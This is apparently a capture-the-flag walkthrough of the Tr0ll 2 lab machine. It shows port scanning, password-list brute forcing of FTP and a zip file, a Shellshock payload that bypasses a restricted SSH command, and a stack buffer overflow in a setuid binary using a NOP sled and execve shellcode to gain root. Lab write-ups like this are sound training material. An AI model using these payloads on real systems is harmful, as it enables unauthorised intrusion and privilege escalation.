# Tr0ll 2
![](https://i.imgur.com/36wunhL.png)

![](https://i.imgur.com/1JR58TI.png)
Host is `192.168.227.132`
![](https://i.imgur.com/iu3UXjU.png)
Victim is `192.168.227.137`
`nmap -sS -sV -A -p- -oN NmapTr0llLv2.txt 192.168.227.137`
![](https://i.imgur.com/VL5Fd9r.png)
Here we got three port open: vsftpd 2.0.8 or later/21, OpenSSH 5.9p1/22, Apache httpd 2.2.22/80

This time, no anonymous FTP, :(
![](https://i.imgur.com/a540Rm9.png)
There's a image here.

![](https://i.imgur.com/dD6twKt.png)
With source, we might get the username: `Tr0ll`, then we need to dig deeper to find the password.

Let's check `robots.txt`.
![](https://i.imgur.com/qZNxeaE.png)

Okay, we got a list.
![](https://i.imgur.com/Hu1Bx71.png)

There's a lot of image, and some url just not existed.
![](https://i.imgur.com/R79t21m.png)

There's only one pic size diff from others, from `/dont_bother`.
![](https://i.imgur.com/N6wGZnB.png)

`file`, `binwalk`, `strings`, `foremost`, give it a stego suite check, then we find `strings` with some message.
![](https://i.imgur.com/t6oanWV.png)

Again, this might point ot a URL.
![](https://i.imgur.com/vDnzF4K.png)

![](https://i.imgur.com/gGfQAKD.png)
Here we go.

`cat answer.txt | base64 -d > decoded.txt`
![](https://i.imgur.com/etissIu.png)
Seems these dictionary repeat twice, `uniq -u decoded.txt > uniq.txt`.

Now we got a password list, let's use it to try FTP first.
`hydra -l Tr0ll -P decoded.txt 192.168.227.137 ftp`

The result is Nope, maybe more simple like AC = PW, and the list will be other used.

Then I try empty password on FTP, failed either. But AC = PW works.
![](https://i.imgur.com/0r6XPnD.png)

There's only one file under directory, `get lmao.zip` and try it with previous list.

Use the uniq list to unzip the compressed file: `fcrackzip -u -D -p uniq.txt lmao.zip`
![](https://i.imgur.com/FOogyC7.png)

Then unzip it: `unzip lmao.zip`
![](https://i.imgur.com/g6XjgfL.png)

Then we got a RSA SSH key here, that means we can use it to SSH connect to target with `-i` premeter with AC = `noob`.
![](https://i.imgur.com/j5jHJuJ.png)

However, the connection still denied by server. That's not the stadard message with wrong key or auth, there's comething behind auth and kicks me off.
![](https://i.imgur.com/9r2gv9o.png)

Turn on the ssh verbose mode to debug:`ssh -v noob@192.168.227.137 -i noob`
![](https://i.imgur.com/iASJeVt.png)
![](https://i.imgur.com/TZQrQoy.png)
Compare to normal ssh login message in dpwwn03, there's something strange.
```
debug1: client_input_channel_req: channel 0 rtype exit-status reply 0
debug1: client_input_channel_req: channel 0 rtype eow@openssh.com reply 0
```

I thought it doessn't set shell property for this account, so I try: `ssh -v noob@192.168.227.137 -i noob /bin/sh`, however, that still not the answer.

After all, I found some writeup point the hint about shellshock which we been used in SickOS1.1, but it's little bit different in ssh.
https://resources.infosecinstitute.com/practical-shellshock-exploitation-part-2/#gref

In order for our exploit to work, the following are the requirements:
* Obviously, a vulnerable bash shell (below 4.3)
* User must be authenticated using 'authorization_keys'
* User must be restricted to run some specific commands.

According to article, the vuln is due to the default commands append in /.ssh/authorized_keys on target with vuln bash(just guess, hope it's there), which also blocked our access to the target.

Now, use shellshock payload to bypass the commands: `ssh -v noob@192.168.227.137 -i noob '() { :;}; /bin/sh'`
Careful about the payload's space and quote.

![](https://i.imgur.com/nIvle19.png)
We in.

Settup a python pty for better UX. `python -c 'import pty;pty.spawn("/bin/bash")'`
If you need, folow this article to set up for more:
https://blog.ropnop.com/upgrading-simple-shells-to-fully-interactive-ttys/

Checking for files where SUID bit is set:
`find / -perm -g=s -o -perm -4000 ! -type l -maxdepth 3 -exec ls -ld {} \; 2>/dev/null`
http://man7.org/linux/man-pages/man1/find.1.html
> * -perm -mode : All of the permission bits mode are set for the file.
> * g=s : The letter s denotes that the setuid (or setgid, depending on the column) bit is set. When an executable is setuid, it runs as the user who owns the executable file instead of the user who invoked the program.
> * -o : or
> * 4000 : SUID.
> * ! expr True if expr is false.  This character will also usually need protection from interpretation by the shell.
> * -type l: type command, l stand for symbolic links.
> * {} : expands to the filename of each file or directory found.
> * \; : end -exec command.

![](https://i.imgur.com/p0VVoAn.png)
We got lot of hits. Interesting ones are series doors under `/nothing_to_see_here/choose_wisely`.

![](https://i.imgur.com/XiCYjkl.png)
After I access to door1, there's echo system here, which might contain the BoF vuln in it.

`./r00t $(python -c 'print "A"*500')`
![](https://i.imgur.com/RcKfUAO.png)

File missing...
I switch to door2, file is there.
![](https://i.imgur.com/EUB1oBE.png)

Ok, there's really a segmentation fault.
![](https://i.imgur.com/8DH98rx.png)
`strcpy()` always caome with problem.

Generate a payload.
https://github.com/Svenito/exploit-pattern
Or pattern_create in peda/msf.
Pass the python script with `chmod +x` to `/bin`
![](https://i.imgur.com/B0dSxTF.png)

Now, try to use pattern to locate the BoF point.
![](https://i.imgur.com/F0OOM59.png)
Ok, door2's `r00t` also disappeared, and `r00t` in door3 terminate the ssh session.

![](https://i.imgur.com/PZ975sD.png)
Seems the binary in these door will be swapped by cron?
Another `r00t` wil limit the command I can use.

![](https://i.imgur.com/OuUlUl0.png)
`file` the vinary before exec it, the right `r00t` buildID might start with `0x438546c5`

![](https://i.imgur.com/UqHxdVF.png)
We got the `EIP` value here, use pattern again to find the offset number.

![](https://i.imgur.com/rpAm3xw.png)
268, let's make EIP point to the ESP value where our shellcode locate.

If binary miss, change directory out and back.

As https://resources.infosecinstitute.com/vulnhub-machines-walkthrough-series-tr0ll-2/#gref mention:
> It’s very important to note that OS loader places the environment variable before stack areas that vary, so it will directly affect the ESP address. Also, how the program is invoked is very important.
> Below we try invocation with env and unsetting LINES and COLUMNS. We got the ESP address below...

That's really important skill to use GDB solve a PoE binary challenge. But, in this challenge, according to there's no limit in input buffer, you can also simply increase your `NOP` section to increase the hit rate, instead of get the real $ESP address.

```
env - gdb r00t
show env
unset env LINES
unset env COLUMNS
r $(python -c 'print "A"*268 + "B"*4 + "\x90"*100 + "C"*100')
```
![](https://i.imgur.com/aKRu4VD.png)
`x/500x $esp`
![](https://i.imgur.com/NkalEjB.png)
![](https://i.imgur.com/hrrR7hS.png)
![](https://i.imgur.com/f7eZeR5.png)
Get Shellcode from shell-storm:
http://shell-storm.org/shellcode/
![](https://i.imgur.com/fVi2zQE.png)

With Linux x86, I found this: 
http://shell-storm.org/shellcode/files/shellcode-752.php

Get $esp address:
```
r $(python -c 'print "A"*268 + "\x80\xfc\xff\xbf" + "\x90"*16 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"')
```
Get root and cat the Proof.txt.
![](https://i.imgur.com/avDIzX3.png)

Increase `NOP` section:
```
$(python -c 'print "A"*268 + "\x10\xff\xff\xbf" + "\x90"*400 + "\x31\xc9\xf7\xe1\x51\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\xb0\x0b\xcd\x80"')
```
![](https://i.imgur.com/qlX6YOf.png)

